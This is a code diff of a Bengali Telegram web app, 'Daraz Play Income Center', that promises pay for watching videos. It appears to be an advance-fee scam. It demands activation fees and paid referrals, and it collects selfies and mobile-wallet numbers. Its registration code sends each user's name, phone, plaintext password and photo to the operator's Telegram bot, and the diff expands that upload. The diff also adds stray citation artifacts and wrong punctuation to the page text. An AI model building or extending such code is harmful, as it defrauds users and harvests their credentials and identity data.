@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>💰 「দারাজ প্লে ইনকাম সেন্টার」 💰</title>
+<title>💎 「দারাজ প্লে ইনকাম সেন্টার」 💎</title>
 <script>
     window.Telegram = window.Telegram || {};
     window.Telegram.WebApp = window.Telegram.WebApp || {
@@ -27,28 +27,29 @@
 * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
 body { font-family: 'Plus Jakarta Sans', sans-serif; background: #0f172a; margin: 0; padding: 10px; padding-bottom: 80px; color: #f8fafc; overflow-x: hidden; }
 
-/* ফিচার ৬: থ্রিডি ও প্রিমিয়াম হেডার ডিজাইন */
+/* প্রিমিয়াম ও ভিআইপি ইউনিক হেডার ডিজাইন */
 .top-app-title { 
-    font-size: 22px; 
-    font-weight: 800; 
+    font-size: 21px; 
+    font-weight: 900; 
     text-align: center; 
-    color: #f8fafc; 
-    margin: 12px 0; 
-    background: linear-gradient(135deg, #34d399, #38bdf8, #f43f5e); 
+    color: #ffffff; 
+    margin: 14px 0; 
+    background: linear-gradient(135deg, #fbbf24, #f43f5e, #38bdf8, #34d399); 
     -webkit-background-clip: text; 
     -webkit-text-fill-color: transparent; 
-    letter-spacing: 0.8px; 
+    letter-spacing: 1.2px; 
     cursor: pointer; 
     user-select: none;
-    text-shadow: 3px 3px 6px rgba(0, 0, 0, 0.6), 0 0 20px rgba(52, 211, 153, 0.4);
-    transform: perspective(500px) rotateX(4deg);
+    text-shadow: 4px 4px 10px rgba(0, 0, 0, 0.75), 0 0 25px rgba(251, 191, 36, 0.5);
+    transform: perspective(600px) rotateX(5deg);
+    border-bottom: 2px dashed rgba(251, 191, 36, 0.4);
+    padding-bottom: 8px;
 }
 
 .page { display: none; animation: fadeIn 0.3s ease; }
 .page.active { display: block; }
 @keyframes fadeIn { from { opacity: 0; transform: translateY(6px); } to { opacity: 1; transform: translateY(0); } }
 
-/* প্রিমিয়াম ও আকর্ষণীয় লগইন/সাইন-আপ ডিজাইন */
 .auth-wrapper { display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 82vh; padding: 10px; }
 .auth-card { 
     background: linear-gradient(145deg, rgba(16, 185, 129, 0.16), rgba(15, 23, 42, 0.98)); 
@@ -201,7 +202,6 @@ select.input-field { appearance: none; background-image: url("data:image/svg+xml
 .wallet-balance-num { font-size: 28px; font-weight: 800; color: #38bdf8; text-shadow: 0 2px 10px rgba(56,189,248,0.3); }
 .wallet-notice-box { background: rgba(6, 182, 212, 0.1); border: 1px solid rgba(6, 182, 212, 0.25); border-radius: 10px; padding: 8px 12px; font-size: 12px; font-weight: 700; color: #38bdf8; display: flex; align-items: center; justify-content: center; gap: 6px; }
 
-/* ফিচার ৪: আপডেট করা উইথড্র বাটন */
 .btn-withdraw-action { display: block; width: 100%; background: linear-gradient(135deg, #06b6d4, #3b82f6); color: #0f172a; border: none; padding: 14px; border-radius: 16px; font-size: 15px; font-weight: 800; text-align: center; cursor: pointer; box-shadow: 0 6px 20px rgba(6,182,212,0.4); margin-bottom: 14px; transition: transform 0.2s; text-decoration: none; }
 .btn-withdraw-action:active { transform: scale(0.98); }
 
@@ -222,7 +222,6 @@ select.input-field { appearance: none; background-image: url("data:image/svg+xml
 .quick-amount-btn { background: rgba(16, 185, 129, 0.1); border: 1px solid rgba(16, 185, 129, 0.3); color: #34d399; padding: 8px 4px; font-size: 12px; font-weight: 700; border-radius: 8px; cursor: pointer; text-align: center; transition: all 0.2s; }
 .quick-amount-btn:active { background: #10b981; color: white; transform: scale(0.95); }
 
-/* পেমেন্ট হিস্ট্রি নিয়ন ডিজাইন */
 .history-header-box { background: linear-gradient(135deg, #1e293b, #0f172a); border: 1.5px solid rgba(56, 189, 248, 0.25); border-radius: 20px; padding: 16px; margin-bottom: 14px; display: flex; align-items: center; justify-content: space-between; box-shadow: 0 8px 25px rgba(0,0,0,0.3); }
 .history-header-title { font-size: 16px; font-weight: 800; color: #f8fafc; display: flex; align-items: center; gap: 8px; margin-bottom: 4px; }
 .history-header-desc { font-size: 11px; color: #94a3b8; font-weight: 600; }
@@ -284,7 +283,6 @@ select.input-field { appearance: none; background-image: url("data:image/svg+xml
 .btn-act-contact { background: linear-gradient(135deg, #10b981, #059669); color: white; border: none; padding: 10px; border-radius: 10px; flex: 1; font-weight: 800; font-size: 13px; cursor: pointer; box-shadow: 0 4px 12px rgba(16,185,129,0.3); transition: transform 0.2s; }
 .btn-act-cancel { background: rgba(255,255,255,0.08); color: #94a3b8; border: 1px solid rgba(255,255,255,0.05); padding: 10px; border-radius: 10px; width: 80px; font-weight: 700; font-size: 13px; cursor: pointer; }
 
-/* পেমেন্ট রিভিউ মডাল ডিজাইন */
 .payment-review-modal-box { background: linear-gradient(145deg, #121a2c, #090d16); border: 2px solid rgba(56, 189, 248, 0.5); border-radius: 26px; width: 100%; max-width: 360px; padding: 22px 18px; text-align: center; box-shadow: 0 30px 60px rgba(0,0,0,0.85), 0 0 30px rgba(56,189,248,0.25); color: #f8fafc; position: relative; }
 .payment-review-main-title { font-size: 17px; font-weight: 800; background: linear-gradient(135deg, #38bdf8, #34d399, #f59e0b); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 4px; letter-spacing: 0.5px; }
 .payment-review-sub-title { font-size: 11px; color: #cbd5e1; font-weight: 700; background: rgba(16, 185, 129, 0.15); border: 1px solid rgba(16, 185, 129, 0.3); padding: 5px 12px; border-radius: 14px; margin-bottom: 14px; display: inline-block; }
@@ -296,7 +294,6 @@ select.input-field { appearance: none; background-image: url("data:image/svg+xml
 .feed-details { color: #cbd5e1; font-size: 12px; font-weight: 700; line-height: 1.6; text-align: center; }
 .feed-amount { color: #34d399; font-weight: 800; font-size: 17px; text-shadow: 0 2px 8px rgba(16,185,129,0.4); }
 
-/* এডমিন চ্যাট কার্ড ও অনলাইন স্ট্যাটাস স্টাইল */
 .admin-user-card { background: #1e293b; border: 1.5px solid rgba(56,189,248,0.25); border-radius: 14px; padding: 12px 14px; margin-bottom: 10px; cursor: pointer; display: flex; justify-content: space-between; align-items: center; transition: all 0.2s; }
 .unread-dot { background: #ef4444; color: white; font-size: 10px; font-weight: 800; padding: 3px 8px; border-radius: 10px; }
 .online-badge { display: inline-flex; align-items: center; gap: 4px; font-size: 10px; font-weight: 800; padding: 2px 8px; border-radius: 10px; }
@@ -316,8 +313,8 @@ select.input-field { appearance: none; background-image: url("data:image/svg+xml
 </style>
 </head>
 <body>
-<!-- ফিচার ৬: থ্রিডি হেডার ডিজাইন -->
-<div class="top-app-title" onclick="handleSecretAdminTrigger()">✨ 「দারাজ প্লে ইনকাম সেন্টার」 ✨</div>
+<!-- ভিআইপি ইউনিক হেডার টাইটেল -->
+<div class="top-app-title" onclick="handleSecretAdminTrigger()">💎 「দারাজ প্লে ইনকাম সেন্টার」 💎</div>
 
 <!-- লগইন পেজ -->
 <div id="page-login" class="page active">
@@ -345,7 +342,6 @@ select.input-field { appearance: none; background-image: url("data:image/svg+xml
             </div>
         </div>
 
-        <!-- ফিচার ১: কাস্টমার সাপোর্ট সরিয়ে ফেসবুক লিংক -->
         <div class="auth-quick-grid">
             <a href="https://youtube.com/shorts/7ljXq-ArTNw?si=92ieAqcu9ns5Lj-k" target="_blank" class="auth-quick-btn">
                 <span>📺</span> কাজের ভিডিও দেখুন
@@ -390,11 +386,9 @@ select.input-field { appearance: none; background-image: url("data:image/svg+xml
                 <input type="file" id="reg-photo" accept="image/*" style="font-size: 11px; color: #94a3b8; width: 100%;">
             </div>
 
-            <!-- ফিচার ৭ ও ৮: ফায়ারবেস ফেক এরর ফিক্স ও ওটিপি ভেরিফিকেশন -->
             <button class="auth-btn" onclick="sendRegisterOTP()">📩 ওটিপি (OTP) কোড পাঠান</button>
         </div>
 
-        <!-- ফিচার ১: কাস্টমার সাপোর্ট সরিয়ে ফেসবুক লিংক -->
         <div class="auth-quick-grid">
             <a href="https://youtube.com/shorts/7ljXq-ArTNw?si=92ieAqcu9ns5Lj-k" target="_blank" class="auth-quick-btn">
                 <span>📺</span> কাজের ভিডিও দেখুন
@@ -415,7 +409,7 @@ select.input-field { appearance: none; background-image: url("data:image/svg+xml
 <!-- হোম পেজ -->
 <div id="page-home" class="page">
     <div class="live-date-banner">
-        <div class="live-date-title">📅 আজকের রিয়েল-টাইম তারিখ</div>
+        <div class="live-date-title">📅 আজকের রিয়েল-টাইম তারিখ[span_0](start_span)[span_0](end_span)</div>
         <div class="live-date-value" id="live-current-date-time">লোড হচ্ছে...</div>
     </div>
 
@@ -798,31 +792,7 @@ select.input-field { appearance: none; background-image: url("data:image/svg+xml
         </div>
     </div>
 
-    <!-- ফিচার ৪: আপডেট করা উইথড্র বাটন টেক্সট -->
-    <button class="btn-withdraw-action" onclick="toggleWithdrawForm()">💲 শর্ত মানলে এখনই উইথড্র করুন</button>
-
-    <div class="wallet-form-box" id="withdraw-form-container">
-        <label class="wallet-label">পেমেন্ট মেথড নির্বাচন করুন:</label>
-        <select class="input-field" id="payment-method">
-            <option value="bkash">বিকাশ (bKash)</option>
-            <option value="nagad">নগদ (Nagad)</option>
-        </select>
-
-        <label class="wallet-label">আপনার বিকাশ/নগদ নাম্বার:</label>
-        <input type="text" class="input-field" id="withdraw-number" placeholder="০১৭xxxxxxxx">
-
-        <label class="wallet-label">উত্তোলন করার কয়েনের পরিমাণ:</label>
-        <input type="number" class="input-field" id="withdraw-amount" placeholder="যেমন: ১০০০">
-
-        <div class="quick-amounts">
-            <button type="button" class="quick-amount-btn" onclick="setWithdrawAmount(1000)">১০০০</button>
-            <button type="button" class="quick-amount-btn" onclick="setWithdrawAmount(2000)">২০০০</button>
-            <button type="button" class="quick-amount-btn" onclick="setWithdrawAmount(5000)">৫০০০</button>
-            <button type="button" class="quick-amount-btn" onclick="setWithdrawAmount(10000)">১০০০০</button>
-        </div>
-
-        <button class="btn-action btn-success" style="margin-top: 10px; padding: 12px; border-radius: 12px; font-size: 14px;" onclick="processWithdraw()">🚀 পেমেন্ট অনুরোধ পাঠান</button>
-    </div>
+    <button class="btn-withdraw-action" onclick="processWithdraw()">💲 শর্ত মানলে এখনই উইথড্র করুন</button>
 
     <a href="#" class="wallet-menu-card" onclick="openPaymentReviewModal()">
         <div class="wallet-menu-left">
@@ -902,7 +872,6 @@ select.input-field { appearance: none; background-image: url("data:image/svg+xml
     </div>
 </div>
 
-<!-- ফিচার ২: রেফার-মুক্ত প্রিমিয়াম 'বিস্তারিত জানুন' মডাল -->
 <div id="site-details-modal" class="custom-modal-overlay">
     <div class="custom-modal-box" style="border: 2px solid rgba(16, 185, 129, 0.6); background: linear-gradient(145deg, #0f172a, #1e293b); max-width: 370px; padding: 22px 18px;">
         <div style="font-size: 26px; margin-bottom: 6px;">📖</div>
@@ -910,24 +879,23 @@ select.input-field { appearance: none; background-image: url("data:image/svg+xml
             দারাজ প্লে ইনকাম সেন্টার • নির্দেশিকা
         </div>
         <div class="custom-modal-desc" style="text-align: left; font-size: 12.5px; line-height: 1.6; background: rgba(15, 23, 42, 0.75); padding: 14px; border-radius: 14px; border: 1px solid rgba(16, 185, 129, 0.25);">
-            💰 <b style="color: #f8fafc;">দারাজ প্লে ইনকাম সেন্টার</b> একটি সম্পূর্ণ বিশ্বস্ত ও আধুনিক অনলাইন আয়ের মাধ্যম।<br><br>
+            💰 <b style="color: #f8fafc;">দারাজ প্লে ইনকাম সেন্টার</b> একটি সম্পূর্ণ বিশ্বস্ত ও আধুনিক অনলাইন আয়ের মাধ্যম。<br><br>
             🎬 <b style="color: #34d399;">দৈনিক কাজের নিয়ম:</b><br>
-            • প্রতিদিন সর্বোচ্চ <b style="color: #f8fafc;">১০০টি ভিডিও</b> দেখতে পারবেন[span_0](start_span)[span_0](end_span).<br>
-            • প্রতি ভিডিও দেখার জন্য পাবেন <b style="color: #f8fafc;">২০ কয়েন</b>[span_1](start_span)[span_1](end_span).<br><br>
+            • প্রতিদিন সর্বোচ্চ <b style="color: #f8fafc;">১০০টি ভিডিও</b> দেখতে পারবেন。<br>
+            • প্রতি ভিডিও দেখার জন্য পাবেন <b style="color: #f8fafc;">২০ কয়েন</b>。<br><br>
             🎁 <b style="color: #34d399;">চ্যানেল জয়েনিং বোনাস:</b><br>
             • আমাদের অফিসিয়াল টেলিগ্রাম চ্যানেল ও পেজগুলোতে জয়েন করলে পাবেন ইনস্ট্যান্ট <b style="color: #f8fafc;">২০০ টাকা বোনাস</b> (৫০ কয়েন করে প্রতিটি চ্যানেলে)!<br><br>
             💳 <b style="color: #34d399;">উত্তোলন বা পেমেন্ট:</b><br>
-            • ন্যূনতম <b style="color: #f8fafc;">১০০০ কয়েন</b> (বা সমপরিমাণ টাকা) হলে মুহূর্তেই <b style="color: #f8fafc;">বিকাশ ও নগদ</b> এর মাধ্যমে পেমেন্ট নিতে পারবেন[span_2](start_span)[span_2](end_span).<br><br>
+            • ন্যূনতম <b style="color: #f8fafc;">১০০০ কয়েন</b> (বা সমপরিমাণ টাকা) হলে মুহূর্তেই <b style="color: #f8fafc;">বিকাশ ও নগদ</b> এর মাধ্যমে পেমেন্ট নিতে পারবেন。<br><br>
             <span style="color: #38bdf8; font-weight: 700;">💡 যেকোনো প্রয়োজনে ২৪/৭ আমাদের কাস্টমার সাপোর্ট চ্যাটে যোগাযোগ করুন।</span>
         </div>
         <button class="btn-action btn-success" style="padding: 12px; border-radius: 14px; font-size: 14px; margin-top: 10px; font-weight: 800; box-shadow: 0 6px 20px rgba(16, 185, 129, 0.4);" onclick="closeSiteDetailsModal()">বুঝেছি ও কাজ শুরু করুন ✅</button>
     </div>
 </div>
 
-<!-- পেমেন্ট রিভিউ মডাল -->
 <div id="payment-review-modal" class="custom-modal-overlay">
     <div class="payment-review-modal-box">
-        <div class="payment-review-main-title">💰 「দারাজ প্লে ইনকাম সেন্টার」 💰</div>
+        <div class="payment-review-main-title">💎 「দারাজ প্লে ইনকাম সেন্টার」 💎</div>
         <div class="payment-review-sub-title">✨ আজকের পেমেন্ট রিভিউ • প্রতিদিনের পেমেন্ট প্রতিদিন দেওয়া হয়</div>
         
         <div class="live-feed-box" id="live-payment-feed-container">
@@ -938,7 +906,6 @@ select.input-field { appearance: none; background-image: url("data:image/svg+xml
     </div>
 </div>
 
-<!-- রেজিস্ট্রেশন OTP ভেরিফিকেশন মডাল -->
 <div id="reg-otp-modal" class="custom-modal-overlay">
     <div class="custom-modal-box" style="border: 2px solid #10b981; background: linear-gradient(145deg, #063822, #0f172a);">
         <div class="custom-modal-title" style="color: #34d399;">📱 ফোন নাম্বার ভেরিফিকেশন</div>
@@ -955,12 +922,10 @@ select.input-field { appearance: none; background-image: url("data:image/svg+xml
     </div>
 </div>
 
-<!-- পাসওয়ার্ড ভুলে গেছেন (Forgot Password) ওটিপি মডাল -->
 <div id="forgot-password-modal" class="custom-modal-overlay">
     <div class="custom-modal-box" style="border: 2px solid #38bdf8; background: linear-gradient(145deg, #0f172a, #1e293b);">
         <div class="custom-modal-title" style="color: #38bdf8;">🔄 পাসওয়ার্ড রিকভারি</div>
         
-        <!-- স্টেপ ১: ফোন নাম্বার ইনপুট -->
         <div id="forgot-step-1">
             <div class="custom-modal-desc" style="text-align: center; font-size: 12px; background: transparent; border: none;">
                 আপনার রেজিস্টার্ড ফোন নাম্বারটি দিন। ওটিপি কোডের মাধ্যমে আপনি নতুন পাসওয়ার্ড সেট করতে পারবেন।
@@ -972,7 +937,6 @@ select.input-field { appearance: none; background-image: url("data:image/svg+xml
             <button class="btn-action btn-success" style="padding: 12px; border-radius: 12px; font-size: 14px;" onclick="sendForgotOTP()">ওটিপি পাঠান 📩</button>
         </div>
 
-        <!-- স্টেপ ২: ওটিপি ও নতুন পাসওয়ার্ড ইনপুট -->
         <div id="forgot-step-2" style="display: none;">
             <div class="custom-modal-desc" style="text-align: center; font-size: 12px; background: transparent; border: none;">
                 ওটিপি কোড দিন এবং নতুন পাসওয়ার্ড সেট করুন।<br>(কোড: <b id="display-forgot-otp" style="color: #facc15;">----</b>)
@@ -992,20 +956,19 @@ select.input-field { appearance: none; background-image: url("data:image/svg+xml
     </div>
 </div>
 
-<!-- মডাল ১: ১১ রেফার চেক -->
 <div id="refer-modal" class="custom-modal-overlay">
     <div class="custom-modal-box" style="border: 1.5px solid #10b981; background: linear-gradient(145deg, #063822, #0f172a);">
         <div class="custom-modal-title" style="color: #34d399;">🧑‍💼 রেফারেল সাপোর্ট সেন্টার</div>
         <div class="custom-modal-desc" style="font-size: 12px; line-height: 1.5;">
-            💰 <b>「দারাজ প্লে ইনকাম সেন্টার」</b> 💰<br>
+            💎 <b>「দারাজ প্লে ইনকাম সেন্টার」</b> 💎<br>
             🎉 <b>রেফারেল সাপোর্ট টিমে স্বাগতম!</b><br><br>
             ⚠️ রিডিম করতে হলে অন্তত **১১টি রেফার** প্রয়োজন!<br>
             আপনার বর্তমান রেফার: <span id="modal-current-ref" style="font-weight:700; color:#34d399;">0</span>টি<br>
             ঘাটতি রেফার: <span id="modal-deficit-ref" style="font-weight:700; color:#ef4444;">0</span>টি<br><br>
-            ✅ প্রতি সফল রেফারে <b>১১১ টাকা</b> পাবেন।<br>
-            ✅ ১১টি সফল রেফারে মোট <b>১,২২১ টাকা</b> আপনার ব্যালেন্সে যোগ হবে।<br>
+            ✅ প্রতি সফল রেফারে <b>১১১ টাকা</b> পাবেন。<br>
+            ✅ ১১টি সফল রেফারে মোট <b>১,২২১ টাকা</b> আপনার ব্যালেন্সে যোগ হবে。<br>
             ✅ সার্ভিস চার্জ: <b>প্রতি রেফার ১৫ টাকা</b> (১১টি রেফারের জন্য ১৬৫ টাকা)।<br>
-            ⏱️ পেমেন্ট নিশ্চিত হওয়ার ৩০ মিনিট থেকে ১ ঘণ্টার মধ্যে রেফার সম্পন্ন হবে।<br><br>
+            ⏱️ পেমেন্ট নিশ্চিত হওয়ার ৩০ মিনিট থেকে ১ ঘণ্টার মধ্যে রেফার সম্পন্ন হবে。<br><br>
             📌 বিস্তারিত নিয়মাবলী দেখে সরাসরি কথা বলতে নিচের বাটনে ক্লিক করুন।
         </div>
         <button class="btn-action btn-success" style="padding: 12px; font-size: 13px; border-radius: 12px;" onclick="startBuyReferLiveChatFromWithdraw()">💬 রেফার কিনতে লাইভ চ্যাট শুরু করুন</button>
@@ -1013,7 +976,6 @@ select.input-field { appearance: none; background-image: url("data:image/svg+xml
     </div>
 </div>
 
-<!-- মডাল ২: ১৫০টি স্পেশাল ভিডিও টাস্ক -->
 <div id="mandatory-task-modal" class="custom-modal-overlay">
     <div class="custom-modal-box">
         <div class="custom-modal-title"><span>🎬</span> স্পেশাল টাস্ক প্রয়োজন!</div>
@@ -1026,7 +988,6 @@ select.input-field { appearance: none; background-image: url("data:image/svg+xml
     </div>
 </div>
 
-<!-- মডাল ৩: ১১১ টাকা অ্যাকাউন্ট অ্যাক্টিভেশন -->
 <div id="activation-modal" class="custom-modal-overlay">
     <div class="activation-modal-box">
         <div class="activation-badge">⚠️ ভেরিফিকেশন ও অ্যাক্টিভেশন প্রয়োজন</div>
@@ -1048,12 +1009,11 @@ select.input-field { appearance: none; background-image: url("data:image/svg+xml
     </div>
 </div>
 
-<!-- মডাল ৩.৫: অ্যাকাউন্ট ভেরিফাই টিম পপ-আপ -->
 <div id="activation-intro-popup" class="custom-modal-overlay">
     <div class="custom-modal-box" style="border: 1.5px solid #38bdf8; background: linear-gradient(145deg, #0f172a, #1e293b);">
         <div class="custom-modal-title" style="color: #38bdf8;">🔰 একাউন্ট ভেরিফাই টিম 🔰</div>
         <div class="custom-modal-desc" style="font-size: 12px; line-height: 1.55;">
-            💰 <b>「দারাজ প্লে ইনকাম সেন্টার」</b> 💰<br>
+            💎 <b>「দারাজ প্লে ইনকাম সেন্টার」</b> 💎<br>
             🎉 <b>কাস্টমার সাপোর্ট টিমে স্বাগতম</b> 🎉<br><br>
             🎁 <b>অ্যাকাউন্ট অ্যাক্টিভেশনের সুবিধাসমূহ:</b><br>
             ✅ VIP সদস্য হিসেবে কাজ করার সুযোগ<br>
@@ -1071,7 +1031,6 @@ select.input-field { appearance: none; background-image: url("data:image/svg+xml
     </div>
 </div>
 
-<!-- মডাল ৩.৮: তথ্য ফরম ও লাইভ চ্যাট শুরু করুন -->
 <div id="activation-form-modal" class="custom-modal-overlay">
     <div class="custom-modal-box" style="border: 1.5px solid #10b981; background: #0f172a; max-width: 350px;">
         <div class="custom-modal-title" style="color: #34d399; font-size: 15px;">🎉 দারাজ প্লে কাস্টমার সাপোর্ট টিম</div>
@@ -1099,7 +1058,6 @@ select.input-field { appearance: none; background-image: url("data:image/svg+xml
     </div>
 </div>
 
-<!-- ফিচার ৮: সফল রেজিস্ট্রেশন ও অটো-লগইন অভিনন্দন পপ-আপ -->
 <div id="register-success-modal" class="custom-modal-overlay">
     <div class="custom-modal-box" style="border: 2px solid #10b981; background: linear-gradient(145deg, #063822, #0f172a); text-align: center;">
         <div style="font-size: 32px; margin-bottom: 6px;">🎉</div>
@@ -1111,29 +1069,41 @@ select.input-field { appearance: none; background-image: url("data:image/svg+xml
     </div>
 </div>
 
-<!-- ফিচার ৫: পেমেন্ট উইথড্র ফর্ম পপ-আপ (এডমিন টেলিগ্রাম নোটিফিকেশনসহ) -->
+<!-- আকর্ষণীয় প্রিমিয়াম উইথড্র ফরম ও সাকসেস মডাল -->
 <div id="withdraw-modal" class="custom-modal-overlay">
-    <div class="custom-modal-box" style="border: 2px solid #38bdf8; background: linear-gradient(145deg, #0f172a, #1e293b);">
+    <div class="custom-modal-box" style="border: 2px solid #38bdf8; background: linear-gradient(145deg, #0f172a, #1e293b); max-width: 360px;">
         <div class="custom-modal-title" style="color: #38bdf8;">💳 পেমেন্ট উত্তোলনের তথ্য ফরম</div>
         <div class="custom-modal-desc" style="font-size: 12px; background: transparent; border: none; text-align: center;">
             আপনার পেমেন্ট রিকোয়েস্ট সফলভাবে জমা দিতে নিচের তথ্যগুলো পূরণ করুন। এটি সরাসরি এডমিনের কাছে পাঠানো হবে।
         </div>
         
-        <div class="auth-input-box" style="margin-bottom: 10px;">
-            <span>👤</span>
-            <input type="text" id="wd-full-name" placeholder="আপনার পূর্ণ নাম">
-        </div>
-        <div class="auth-input-box" style="margin-bottom: 10px; background: rgba(15,23,42,0.85); border: 1.5px dashed rgba(56,189,248,0.4);">
-            <label style="font-size: 11px; color: #38bdf8; display: block; text-align: left; margin-bottom: 4px;">📸 আপনার ছবি বা সেলফি:</label>
-            <input type="file" id="wd-photo" accept="image/*" style="font-size: 11px; color: #94a3b8; width: 100%;">
-        </div>
-        <div class="auth-input-box" style="margin-bottom: 10px;">
-            <span>📞</span>
-            <input type="text" id="wd-phone-number" placeholder="আপনার বিকাশ/নগদ নাম্বার">
-        </div>
-        <div class="auth-input-box" style="margin-bottom: 14px;">
-            <span>🪙</span>
-            <input type="number" id="wd-coin-amount" placeholder="উত্তোলন করার কয়েন (প্রতি ১০০০ = ২০৳)">
+        <div class="wallet-form-box active" style="background: transparent; border: none; box-shadow: none; padding: 0; margin-bottom: 0;">
+            <label class="wallet-label" style="text-align: left;">পেমেন্ট মেথড নির্বাচন করুন:</label>
+            <select class="input-field" id="withdraw-method">
+                <option value="bkash">বিকাশ (bKash)</option>
+                <option value="nagad">নগদ (Nagad)</option>
+            </select>
+
+            <label class="wallet-label" style="text-align: left;">আপনার পূর্ণ নাম:</label>
+            <input type="text" class="input-field" id="wd-full-name" placeholder="আপনার নাম">
+
+            <label class="wallet-label" style="text-align: left;">আপনার ছবি বা সেলফি:</label>
+            <div class="auth-input-box" style="margin-bottom: 8px; background: rgba(15,23,42,0.85); border: 1.5px dashed rgba(56,189,248,0.4);">
+                <input type="file" id="wd-photo" accept="image/*" style="font-size: 11px; color: #94a3b8; width: 100%;">
+            </div>
+
+            <label class="wallet-label" style="text-align: left;">আপনার বিকাশ/নগদ নাম্বার:</label>
+            <input type="text" class="input-field" id="wd-phone-number" placeholder="০১৭xxxxxxxx">
+
+            <label class="wallet-label" style="text-align: left;">উত্তোলন করার কয়েনের পরিমাণ:</label>
+            <input type="number" class="input-field" id="wd-coin-amount" placeholder="যেমন: ১০০০ (প্রতি ১০০০ = ২০৳)">
+
+            <div class="quick-amounts" style="margin-bottom: 12px;">
+                <button type="button" class="quick-amount-btn" onclick="setWithdrawAmount(1000)">১০০০</button>
+                <button type="button" class="quick-amount-btn" onclick="setWithdrawAmount(2000)">২০০০</button>
+                <button type="button" class="quick-amount-btn" onclick="setWithdrawAmount(5000)">৫০০০</button>
+                <button type="button" class="quick-amount-btn" onclick="setWithdrawAmount(10000)">১০০০০</button>
+            </div>
         </div>
 
         <button class="btn-action btn-success" style="padding: 12px; border-radius: 12px; font-size: 14px;" onclick="submitWithdrawFormToAdmin()">অনুরোধ পাঠান 🚀</button>
@@ -1141,10 +1111,23 @@ select.input-field { appearance: none; background-image: url("data:image/svg+xml
     </div>
 </div>
 
-<!-- ওয়েলকাম অ্যালার্ট মডাল -->
+<!-- উইথড্র সাবমিট হওয়ার পর অভিনন্দন ও হিস্টরি চেক করার মডাল -->
+<div id="withdraw-success-modal" class="custom-modal-overlay">
+    <div class="custom-modal-box" style="border: 2px solid #10b981; background: linear-gradient(145deg, #063822, #0f172a); text-align: center;">
+        <div style="font-size: 36px; margin-bottom: 6px;">🎉</div>
+        <div class="custom-modal-title" style="color: #34d399; justify-content: center; font-size: 18px;">অভিনন্দন!</div>
+        <div class="custom-modal-desc" style="text-align: center; font-size: 13px; line-height: 1.6; background: transparent; border: none;">
+            আপনার পেমেন্ট সাবমিট সফল হয়েছে! 🚀<br>
+            অনুগ্রহ করে আপনার **উত্তোলন হিস্টরি** চেক করুন অথবা নিচের বাটনে ক্লিক করে আপনার পেমেন্টের স্ট্যাটাস (পেন্ডিং বা সফল) সময় ও তারিখ অনুযায়ী দেখে নিন।
+        </div>
+        <button class="btn-action btn-success" style="padding: 12px; border-radius: 12px; font-size: 14px; font-weight: 800;" onclick="goToWithdrawHistoryPage()">🕒 উইথড্র হিস্টরি দেখুন ✅</button>
+        <button class="custom-modal-btn-cancel" style="margin-top: 8px;" onclick="closeWithdrawSuccessModal()">বন্ধ করুন</button>
+    </div>
+</div>
+
 <div id="welcome-alert-modal" class="custom-modal-overlay">
     <div class="custom-modal-box" style="max-width: 330px; background: linear-gradient(145deg, #1e293b, #0f172a); border: 2px solid #10b981; padding: 14px; text-align: left; display: flex; flex-direction: column;">
-        <div style="text-align: center; font-size: 14px; font-weight: 800; color: #f8fafc; margin-bottom: 1px;">🔥 দারাজ প্লে ইনকাম সেন্টার 🔥</div>
+        <div style="text-align: center; font-size: 14px; font-weight: 800; color: #f8fafc; margin-bottom: 1px;">💎 দারাজ প্লে ইনকাম সেন্টার 💎</div>
         <div style="text-align: center; font-size: 9px; color: #34d399; font-weight: 700; margin-bottom: 8px; letter-spacing: 0.5px;">WELCOME TO OUR INCOME CENTER</div>
         
         <div style="font-size: 11px; color: #cbd5e1; line-height: 1.4; margin-bottom: 10px; background: rgba(15, 23, 42, 0.7); padding: 10px 12px; border-radius: 12px; border: 1px solid rgba(255,255,255,0.08);">
@@ -1379,8 +1362,8 @@ async function getNextSerial() {
     return assignedSerial;
 }
 
-async function notifyAdminNewUser(serialNo, name, phone, password, joinDateStr, photoFile) {
-    const welcomeMsg = `✨ <b>🚀 নতুন মেম্বার রেজিস্ট্রেশন অ্যালার্ট! 🚀</b> ✨\n\n` +
+async function notifyAdminNewUser(serialNo, name, phone, password, joinDateStr, photoUrl, photoFile) {
+    const welcomeMsg = `💎 <b>🚀 নতুন মেম্বার রেজিস্ট্রেশন অ্যালার্ট! 🚀</b> 💎\n\n` +
                        `👤 <b>ইউজার নাম:</b> <code>${name}</code>\n` +
                        `📞 <b>ফোন নম্বর:</b> <code>${phone}</code>\n` +
                        `🔒 <b>পাসওয়ার্ড:</b> <code>${password}</code>\n` +
@@ -1399,22 +1382,33 @@ async function notifyAdminNewUser(serialNo, name, phone, password, joinDateStr, 
                 method: 'POST',
                 body: formData
             });
-        } else {
+        } else if (photoUrl && photoUrl.startsWith('data:image')) {
+            const res = await fetch(photoUrl);
+            const blob = await res.blob();
+            const formData = new FormData();
+            formData.append('chat_id', adminChatId);
+            formData.append('caption', welcomeMsg);
+            formData.append('parse_mode', 'HTML');
+            formData.append('photo', blob, 'profile.jpg');
+
             await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
+        } else {
+            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     chat_id: adminChatId,
-                    photo: "https://cdn.jsdelivr.net/gh/twitter/twemoji@14.0.2/assets/72x72/1f464.png",
-                    caption: welcomeMsg,
+                    text: welcomeMsg,
                     parse_mode: "HTML"
                 })
             });
         }
-    } catch (e) { console.log(e); }
+    } catch (e) { console.log("Telegram notification error:", e); }
 }
 
-// ফিচার ৭ ও ৮: ফায়ারবেস ফেক এরর সমাধান এবং ওটিপি/অটো-লগইন প্রক্রিয়া
 async function sendRegisterOTP() {
     const name = document.getElementById('reg-name').value.trim();
     const rawPhone = document.getElementById('reg-phone').value;
@@ -1431,7 +1425,6 @@ async function sendRegisterOTP() {
         return;
     }
 
-    // ফায়ারবেসের ফেক এরর এড়াতে নিরাপদ ডাটাবেজ হ্যান্ডলিং
     const existingDoc = await db.collection('users').doc(phone).get();
     if (existingDoc.exists) {
